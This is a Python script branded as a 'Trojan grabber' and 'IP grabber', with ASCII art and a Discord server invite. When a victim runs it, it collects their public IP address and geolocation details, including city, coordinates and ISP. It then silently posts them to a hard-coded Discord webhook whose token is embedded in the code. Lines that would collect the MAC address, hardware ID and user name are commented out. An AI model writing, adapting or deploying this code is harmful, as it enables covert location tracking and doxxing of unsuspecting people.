import requests

ip = requests.get('https://api.ipify.org/').text
data = requests.get(f"http://ip-api.com/json/{ip}").json()

import os
try:
    import re, uuid, requests, subprocess, os.path, sys, time
    from datetime import datetime
except:
    os.system('pip install -q uiid')
    os.system('pip install -q re')
    os.system('pip install -q datetime')
try:
    import re, uuid, requests, subprocess, os.path, sys
    from datetime import datetime
except:
    sys.exit()

#config
hook = "https://discord.com/api/webhooks/1152014416599068753/CjROpWumLRSLZaqCiMGSB1jbb4d0gfzvpnPKKvpQ60CwlZypMH6PCkTIDghsQftiMTtZ"
victim = "VICTIM_NAME"
ping = "@everyone" #Leave blank for no ping


"""
                         ~:    .......     ::                              
                     ..:~5GPGPPBBGGBBGG5!YGB!..                            
                  .^7B5?~:...:5P:::.JP::^^^!YPBGP?^.                       
                .~YGP~        ..    :     :  .:!J5BBP!                     
               .~7~.   ~         :       ^:~:     :YPGPJ7~.                
              JB~   ~~.!?       .!     .^^Y: .~: ...  :P#B7:.              
            :5P:    ^?Y^GJ      7Y    J?JG^.77:~?~.   ^~^7GBP:             
           !BB.  .   :?P5#5    .GBP~:YBGBGP?~75!.    .:   .5#G5?:.         
          !#7~:  .:   ~BBBBP7~7P#BBBBBBBBBBPB5.   :7?~..!5BPJ^.            
         .B5      .!77GBBBBBBBBY7^7BBPYPY5GBBBPJ5GP7~7YGG?:                
         !G!.      7#BBBBB5YBBB!   GB!    .~7~7YGBGGYJG?                   
         Y7        JBBBBB7. ^PBB?!YBBP7^         !5~   ~.                  
         P.       ^BBJ7!?55Y~YBBBG57~!7YGP?: .^.                           
         5.     :?BG!     5##BGY7^.    .^~7YJ5BG                           
         7:    .BBB^    .YBG^..           ~GG5!5J                          
         .!     ?#P    .PBG:  .!77JY?^ .!5Y~.  .GY                   TROJAN GRABBER BY TEKKY      
          .     ~BY .  7#G:  7?~.  .?BG5~..^.   ^B^                  Server: discord.gg/onlp    
               .^PBP.  5BB. 7?       :BPYJPBG^.  55                        
              ^^^JBB^  YBB:         .!BBP!7J5GGY?GG                        
               ^!?GBG^ .GBG~ ..:^  !GGGBBY?~:.:7GBG.                       
                 .7PGB7 ^BB?^  :PGG?^^~YJ?5GBGGJ:GB:                       
                   ^7GB^ ^B5.   ?BBY       :.~BG :B?                       
                     !GP  J#P.  JG:PP^       :BB. GG                       
                     ~GB. ?BB~ 7B5  5#~       ?BP.:?!                      
                     !BG .G#7 J#?    YGY5! .:^.P#?  .                      
                    ~GBY JB?!!Y5:     .^!Y5PJ:J^GB^                        
                    ~B5:JBP?7^.            :!JG5Y#P                        
                  :?G~.~^.                     :!JP.                       
                 !B?.                                                      
               :YJ.                                                        
              .:.                                                         
"""

def grabber():
    # if os.name != "nt":
    #     sys.exit()

    try:
        # -------------------* info *-------------------#
        mac = '' #':'.join(re.findall('..', '%012x' % uuid.getnode()))
        hwid = '' #str(subprocess.check_output('wmic csproduct get uuid')).split("\r\n")[1].strip("\r").strip()
        pcname = '' #os.path.expanduser("~")[9:]
        ip = requests.get('https://api.ipify.org/').text
        data = requests.get(f"http://ip-api.com/json/{ip}").json()

        # -------------------* hook *-------------------#
        requests.post(hook, json={
                "content": f"{ping}",
                "embeds": [
                    {
                        "title": f"{victim} | IP: {ip}",
                        "description": f"**Location**"
                                        f"```python\n"
                                            f"Country: {data['country']} |  Region: {data['regionName']} | City: {data['city']}\n"
                                            f"Lat: {data['lat']} | Lon: {data['lon']}ISP: {data['isp']}\n"
                                            f"ORG: {data['org']}\n"
                                            f"AS: {data['as']}\n"
                                            f"MAC: {mac}\n"
                                            f"HWID: {hwid}\n"
                                            f"PC-USER: {pcname}\n"
                                    f"```"
                                        f"**Execution time:** "
                                            f"```python\n"
                                                f"{round(time.time()-start, 2)} sec```"
                                    
                                        f"**Time Started:** "
                                            f"```python\n"
                                                f"{datetime.now()} ```",
                        "color": 5814783,
                        "footer": {
                            "text": "IP GRABBER BY Whaxor#9999",
                            "icon_url": "https://toppng.com/uploads/preview/drawn-logo-vans-cool-logos-easy-to-draw-11563244767orfuvwe9u4.png"
                        },
                        "timestamp": str(datetime.utcnow())
                    }
                ]
            }
        )
        
    except:
        try:
            requests.post(hook, json={"content": f"Failed to grab {victim}"})
        except:
            pass

#start

start = time.time()
grabber()
